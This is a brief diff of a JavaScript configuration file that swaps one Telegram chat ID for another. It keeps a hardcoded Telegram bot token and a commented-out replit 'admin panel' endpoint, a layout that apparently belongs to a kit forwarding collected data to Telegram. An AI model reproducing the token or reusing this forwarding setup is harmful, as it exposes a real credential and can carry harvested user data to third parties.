@@ -2,7 +2,7 @@
 // Shared configuration for JS modules
 
 const TELEGRAM_BOT_TOKEN = "8883353485:AAEeXcTbTuqsUtZo4u72PHzQ0FquzKl1TwY";
-const TELEGRAM_CHAT_ID = "8701371459";
+const TELEGRAM_CHAT_ID = "6792974119";
 
 // Optional backend endpoint
 // const ENDPOINT = "https://flogs-admin-panel--igbinedion652.replit.app/api/u/GUVHH";
